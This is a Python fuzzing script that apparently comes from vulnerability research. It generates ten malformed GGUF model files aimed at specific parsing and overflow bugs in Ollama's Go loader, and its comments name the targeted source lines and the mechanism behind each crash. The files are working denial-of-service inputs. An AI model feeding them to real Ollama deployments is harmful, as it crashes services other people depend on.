#!/usr/bin/env python3
"""
NEW vulnerability discovery fuzzer for Ollama's Go GGUF parser.

These test vectors target code paths DIFFERENT from the 4 known CVEs:
  - CVE-2025-0317: alignment=0 → div by zero
  - CVE-2025-0315: inflated dim values → unbounded alloc
  - CVE-2025-0312: zero-dim tensor → nil ptr deref (GraphSize)
  - CVE-2024-12055: alignment=0 → unbounded readString

New targets:
  A. Negative int from uint64→int cast in readGGUFString (line 344)
  B. Large n_dims → OOM in shape array allocation (line 206)
  C. Integer overflow in Elements() → wrong tensor.Size() (line 483)
  D. Elements() overflow → negative int64 in Seek (line 259)
  E. Missing tokenizer KV → nil ptr panic in downstream code
  F. Wrong KV type → type assertion panic
  G. Huge metadata values → overflow in GraphSize arithmetic
  H. Invalid KV type enum → unhandled case
"""
import struct
import os
import sys

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

# GGUF KV types
TYPE_UINT8 = 0
TYPE_INT8 = 1
TYPE_UINT16 = 2
TYPE_INT16 = 3
TYPE_UINT32 = 4
TYPE_INT32 = 5
TYPE_FLOAT32 = 6
TYPE_BOOL = 7
TYPE_STRING = 8
TYPE_ARRAY = 9
TYPE_UINT64 = 10
TYPE_INT64 = 11
TYPE_FLOAT64 = 12

# Tensor types
GGML_TYPE_F32 = 0
GGML_TYPE_F16 = 1


def write_header(f, n_tensors, n_kv):
    """Write GGUF v3 header: magic, version, n_tensors, n_kv."""
    f.write(GGUF_MAGIC)
    f.write(struct.pack("<I", GGUF_VERSION))
    f.write(struct.pack("<Q", n_tensors))
    f.write(struct.pack("<Q", n_kv))


def write_string(f, s):
    """Write a GGUF string (uint64 length + bytes)."""
    b = s.encode("utf-8")
    f.write(struct.pack("<Q", len(b)))
    f.write(b)


def write_kv_string(f, key, value):
    write_string(f, key)
    f.write(struct.pack("<I", TYPE_STRING))
    write_string(f, value)


def write_kv_uint32(f, key, value):
    write_string(f, key)
    f.write(struct.pack("<I", TYPE_UINT32))
    f.write(struct.pack("<I", value))


def write_kv_float32(f, key, value):
    write_string(f, key)
    f.write(struct.pack("<I", TYPE_FLOAT32))
    f.write(struct.pack("<f", value))


def write_kv_array_strings(f, key, strings):
    write_string(f, key)
    f.write(struct.pack("<I", TYPE_ARRAY))
    f.write(struct.pack("<I", TYPE_STRING))  # element type
    f.write(struct.pack("<Q", len(strings)))
    for s in strings:
        write_string(f, s)


def write_kv_array_float32(f, key, values):
    write_string(f, key)
    f.write(struct.pack("<I", TYPE_ARRAY))
    f.write(struct.pack("<I", TYPE_FLOAT32))
    f.write(struct.pack("<Q", len(values)))
    for v in values:
        f.write(struct.pack("<f", v))


def write_kv_array_int32(f, key, values):
    write_string(f, key)
    f.write(struct.pack("<I", TYPE_ARRAY))
    f.write(struct.pack("<I", TYPE_INT32))
    f.write(struct.pack("<Q", len(values)))
    for v in values:
        f.write(struct.pack("<i", v))


def write_base_metadata(f):
    """Write standard llama metadata KV pairs. Returns count of KV pairs written."""
    kvs = [
        ("general.architecture", "llama"),
        ("general.file_type", 2),
        ("llama.context_length", 512),
        ("llama.embedding_length", 256),
        ("llama.block_count", 1),
        ("llama.attention.head_count", 4),
        ("llama.attention.head_count_kv", 4),
        ("llama.feed_forward_length", 256),
    ]
    float_kvs = [
        ("llama.rope.freq_base", 10000.0),
        ("llama.attention.layer_norm_rms_epsilon", 1e-5),
    ]
    count = 0
    for key, val in kvs:
        if isinstance(val, str):
            write_kv_string(f, key, val)
        else:
            write_kv_uint32(f, key, val)
        count += 1
    for key, val in float_kvs:
        write_kv_float32(f, key, val)
        count += 1
    # Tokenizer
    write_kv_string(f, "tokenizer.ggml.model", "gpt2")
    count += 1
    write_kv_array_strings(f, "tokenizer.ggml.tokens", ["<unk>", "<s>", "</s>"])
    count += 1
    write_kv_array_float32(f, "tokenizer.ggml.scores", [0.0, 0.0, 0.0])
    count += 1
    write_kv_array_int32(f, "tokenizer.ggml.token_type", [1, 2, 2])
    count += 1
    return count  # 14


def write_tensor_info(f, name, dims, shape, kind, offset):
    write_string(f, name)
    f.write(struct.pack("<I", dims))
    for d in shape:
        f.write(struct.pack("<Q", d))
    f.write(struct.pack("<I", kind))
    f.write(struct.pack("<Q", offset))


def main():
    outdir = sys.argv[1] if len(sys.argv) > 1 else "poc"
    os.makedirs(outdir, exist_ok=True)

    # =========================================================================
    # Test A: Negative int from uint64→int cast in readGGUFString
    #
    # Target: gguf.go:344  length := int(llm.ByteOrder.Uint64(buf))
    #         gguf.go:346  if length > len(llm.scratch) → FALSE (negative < positive)
    #         gguf.go:348  buf = llm.scratch[:length] → PANIC (negative slice index)
    #
    # String length 0x8000000000000000 → int = -9223372036854775808 (negative)
    # Bypasses the "length > scratch" check, hits slice[:negative] → runtime panic
    #
    # NOT the same as known CVEs (those use alignment=0, not negative int cast)
    # =========================================================================
    print("Test A: Negative int cast in readGGUFString (key length 0x8000000000000000)")
    with open(os.path.join(outdir, "new_a_neg_int_cast.gguf"), "wb") as f:
        write_header(f, n_tensors=0, n_kv=1)
        # Write a KV pair whose key length triggers the bug
        # Key length = 0x8000000000000000 → int(-9223372036854775808)
        f.write(struct.pack("<Q", 0x8000000000000000))
        # No key data needed - panic happens before read

    # =========================================================================
    # Test B: Large n_dims → OOM in shape array allocation
    #
    # Target: gguf.go:206  shape := make([]uint64, dims)
    #         dims is uint32, max = 4294967295
    #         make([]uint64, 4294967295) = 32GB allocation → OOM
    #
    # Different from CVE-2025-0315 (which used valid n_dims with huge VALUES)
    # This uses huge n_dims COUNT itself
    # =========================================================================
    print("Test B: Large n_dims (0x7FFFFFFF) → OOM in shape array")
    with open(os.path.join(outdir, "new_b_large_ndims.gguf"), "wb") as f:
        write_header(f, n_tensors=1, n_kv=14)
        write_base_metadata(f)
        # Tensor with n_dims = 0x7FFFFFFF (2 billion)
        write_string(f, "token_embd.weight")
        f.write(struct.pack("<I", 0x7FFFFFFF))  # n_dims = 2B
        # Don't write shape data - OOM happens at make() before reading

    # =========================================================================
    # Test C: Elements() overflow → Size() wraps to 0 → Seek(0)
    #
    # Target: ggml.go:483  count *= n  (uint64 overflow wraps to 0)
    #         ggml.go:489  Size() = Elements() * typeSize() / blockSize() = 0
    #         gguf.go:259  rs.Seek(int64(tensor.Size()), ...) = Seek(0)
    #
    # Two tensors: both with shape=[2^32, 2^32] → Elements()=0 → Size()=0
    # Both tensors get the same file offset → data confusion
    # =========================================================================
    print("Test C: Elements() overflow → Size()=0 (shape 2^32 x 2^32)")
    with open(os.path.join(outdir, "new_c_elements_overflow.gguf"), "wb") as f:
        write_header(f, n_tensors=2, n_kv=14)
        write_base_metadata(f)
        write_tensor_info(f, "tensor_a", 2,
                          [0x100000000, 0x100000000],
                          GGML_TYPE_F32, 0)
        write_tensor_info(f, "tensor_b", 2,
                          [0x100000000, 0x100000000],
                          GGML_TYPE_F32, 0)
        # Pad to alignment and add minimal data
        f.write(b"\x00" * 64)

    # =========================================================================
    # Test D: Elements() overflow → negative int64 Seek
    #
    # Target: ggml.go:483  Elements() wraps to 0xFFFFFFFFFFFFFFFE
    #         ggml.go:489  Size() = 0xFFFFFFFFFFFFFFFE * 4 / 1 = wraps
    #         gguf.go:259  int64(tensor.Size()) → NEGATIVE → seeks backwards!
    #
    # shape=[0xFFFFFFFF, 0x100000001]:
    #   Elements = 0xFFFFFFFF * 0x100000001 = 0xFFFFFFFF00000001 + 0xFFFFFFFF
    #            = 0x1_00000000_00000000 → wraps to 0 on uint64
    # Wait, that's just 0. Let me use [0xFFFFFFFFFFFFFFFF, 1]:
    #   Elements = 0xFFFFFFFFFFFFFFFF * 1 = 0xFFFFFFFFFFFFFFFF
    #   Size = 0xFFFFFFFFFFFFFFFF * 4 / 1 = 0xFFFFFFFFFFFFFFFC
    #   int64(0xFFFFFFFFFFFFFFFC) = -4
    #   Seek(-4) → seeks BACKWARDS
    # =========================================================================
    print("Test D: Elements() → negative int64 Seek (shape 0xFFFFFFFFFFFFFFFF)")
    with open(os.path.join(outdir, "new_d_negative_seek.gguf"), "wb") as f:
        write_header(f, n_tensors=1, n_kv=14)
        write_base_metadata(f)
        write_tensor_info(f, "token_embd.weight", 1,
                          [0xFFFFFFFFFFFFFFFF],
                          GGML_TYPE_F32, 0)
        f.write(b"\x00" * 64)

    # =========================================================================
    # Test E: Missing tokenizer metadata → nil dereference
    #
    # Target: ggml.go (GraphSize or model loading code)
    #   vocab := uint64(f.KV()["tokenizer.ggml.tokens"].(*array[string]).size)
    #   If key doesn't exist → map returns nil → .(*array[string]) panics
    #
    # Different from CVE-2025-0312 (zero-dim tensor causes nil in GraphSize)
    # This causes nil from missing KV entry
    # =========================================================================
    print("Test E: Missing tokenizer metadata → nil pointer")
    with open(os.path.join(outdir, "new_e_missing_tokenizer.gguf"), "wb") as f:
        # Write architecture metadata but NO tokenizer metadata
        n_kv = 10
        write_header(f, n_tensors=0, n_kv=n_kv)
        write_kv_string(f, "general.architecture", "llama")
        write_kv_uint32(f, "general.file_type", 2)
        write_kv_uint32(f, "llama.context_length", 512)
        write_kv_uint32(f, "llama.embedding_length", 256)
        write_kv_uint32(f, "llama.block_count", 1)
        write_kv_uint32(f, "llama.attention.head_count", 4)
        write_kv_uint32(f, "llama.attention.head_count_kv", 4)
        write_kv_uint32(f, "llama.feed_forward_length", 256)
        write_kv_float32(f, "llama.rope.freq_base", 10000.0)
        write_kv_float32(f, "llama.attention.layer_norm_rms_epsilon", 1e-5)
        # NO tokenizer.ggml.model, NO tokenizer.ggml.tokens, etc.

    # =========================================================================
    # Test F: Wrong KV type → type assertion panic
    #
    # Target: Code that reads tokenizer.ggml.tokens as *array[string]
    #   If we write it as a UINT32 instead of ARRAY[STRING], the type
    #   assertion .(*array[string]) panics with "interface conversion"
    #
    # Different from all known CVEs
    # =========================================================================
    print("Test F: Wrong KV type for tokenizer.ggml.tokens → type assertion panic")
    with open(os.path.join(outdir, "new_f_wrong_kv_type.gguf"), "wb") as f:
        n_kv = 14
        write_header(f, n_tensors=0, n_kv=n_kv)
        write_kv_string(f, "general.architecture", "llama")
        write_kv_uint32(f, "general.file_type", 2)
        write_kv_uint32(f, "llama.context_length", 512)
        write_kv_uint32(f, "llama.embedding_length", 256)
        write_kv_uint32(f, "llama.block_count", 1)
        write_kv_uint32(f, "llama.attention.head_count", 4)
        write_kv_uint32(f, "llama.attention.head_count_kv", 4)
        write_kv_uint32(f, "llama.feed_forward_length", 256)
        write_kv_float32(f, "llama.rope.freq_base", 10000.0)
        write_kv_float32(f, "llama.attention.layer_norm_rms_epsilon", 1e-5)
        write_kv_string(f, "tokenizer.ggml.model", "gpt2")
        # WRONG TYPE: tokens as uint32 instead of array[string]
        write_kv_uint32(f, "tokenizer.ggml.tokens", 42)
        # scores as uint32 instead of array[float32]
        write_kv_uint32(f, "tokenizer.ggml.scores", 42)
        # token_type as uint32 instead of array[int32]
        write_kv_uint32(f, "tokenizer.ggml.token_type", 42)

    # =========================================================================
    # Test G: Huge metadata → overflow in GraphSize
    #
    # Target: ggml.go GraphSize():
    #   kv[i] = uint64(float64(context*(embeddingHeadsK+embeddingHeadsV)*headsKVL) * bytesPerElement)
    #   With huge embedding_length and head_count, intermediate values overflow
    #
    # Different from known CVEs (those target parsing, this targets post-parse computation)
    # =========================================================================
    print("Test G: Huge metadata values → GraphSize overflow")
    with open(os.path.join(outdir, "new_g_graphsize_overflow.gguf"), "wb") as f:
        n_kv = 14
        write_header(f, n_tensors=0, n_kv=n_kv)
        write_kv_string(f, "general.architecture", "llama")
        write_kv_uint32(f, "general.file_type", 2)
        write_kv_uint32(f, "llama.context_length", 0xFFFFFFFF)
        write_kv_uint32(f, "llama.embedding_length", 0xFFFFFFFF)
        write_kv_uint32(f, "llama.block_count", 1)
        write_kv_uint32(f, "llama.attention.head_count", 0xFFFFFFFF)
        write_kv_uint32(f, "llama.attention.head_count_kv", 0xFFFFFFFF)
        write_kv_uint32(f, "llama.feed_forward_length", 0xFFFFFFFF)
        write_kv_float32(f, "llama.rope.freq_base", 10000.0)
        write_kv_float32(f, "llama.attention.layer_norm_rms_epsilon", 1e-5)
        write_kv_string(f, "tokenizer.ggml.model", "gpt2")
        write_kv_array_strings(f, "tokenizer.ggml.tokens", ["<unk>", "<s>", "</s>"])
        write_kv_array_float32(f, "tokenizer.ggml.scores", [0.0, 0.0, 0.0])
        write_kv_array_int32(f, "tokenizer.ggml.token_type", [1, 2, 2])

    # =========================================================================
    # Test H: String VALUE with length 0x8000000000000000
    #
    # Same mechanism as Test A but in a KV string VALUE instead of KEY
    # Tests a different call site of readGGUFString
    # =========================================================================
    print("Test H: Negative int cast in readGGUFString (value length 0x8000000000000000)")
    with open(os.path.join(outdir, "new_h_neg_value_len.gguf"), "wb") as f:
        write_header(f, n_tensors=0, n_kv=1)
        # Write a valid key
        write_string(f, "general.architecture")
        f.write(struct.pack("<I", TYPE_STRING))
        # Write a string value with negative-casting length
        f.write(struct.pack("<Q", 0x8000000000000000))
        # No value data - panic happens before read

    # =========================================================================
    # Test I: Tensor name with length 0x8000000000000000
    #
    # Same negative int cast but during tensor name reading
    # Tests yet another call site of readGGUFString
    # =========================================================================
    print("Test I: Negative int cast in readGGUFString (tensor name)")
    with open(os.path.join(outdir, "new_i_neg_tensor_name.gguf"), "wb") as f:
        write_header(f, n_tensors=1, n_kv=14)
        write_base_metadata(f)
        # Tensor name with negative-casting length
        f.write(struct.pack("<Q", 0x8000000000000000))
        # No tensor name data - panic happens at slice[:negative]

    # =========================================================================
    # Test J: KV array with huge count (maxArraySize bypass)
    #
    # Target: gguf.go:422  newArray[uint8](int(n), llm.maxArraySize)
    #   int(n) where n = uint64 can produce negative int
    #   newArray checks: if maxSize < 0 || size <= maxSize
    #   With negative size, size <= maxSize might be true
    #   make([]T, negative_size) → runtime panic
    #
    # Different from known CVEs (array allocation, not string)
    # =========================================================================
    print("Test J: KV array with count causing negative int")
    with open(os.path.join(outdir, "new_j_neg_array_count.gguf"), "wb") as f:
        write_header(f, n_tensors=0, n_kv=1)
        write_string(f, "test.data")
        f.write(struct.pack("<I", TYPE_ARRAY))
        f.write(struct.pack("<I", TYPE_UINT8))  # element type = uint8
        # Array count = 0x8000000000000000 → int = negative
        f.write(struct.pack("<Q", 0x8000000000000000))

    print(f"\nDone. Generated 10 new fuzz GGUF files in {outdir}/")


if __name__ == "__main__":
    main()
